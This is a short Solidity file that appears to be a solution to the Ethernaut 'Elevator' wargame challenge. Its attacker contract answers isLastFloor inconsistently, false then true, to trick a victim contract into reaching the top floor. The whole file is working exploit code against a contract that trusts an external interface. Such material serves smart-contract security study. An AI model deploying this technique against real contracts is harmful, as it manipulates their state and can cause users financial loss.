// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}
contract ElevatorAttacker{
    address public victimContract;
    uint256 callTime = 0;
    constructor(address _victimContract){
        victimContract = _victimContract;
    }
    
    function isLastFloor(uint256) external returns (bool){
        callTime++;
        if(callTime%2==0){
            return true;
        }else{
            return false;
        }
    }

    function attack()external {
        IElevator(victimContract).goTo(0);
    }
}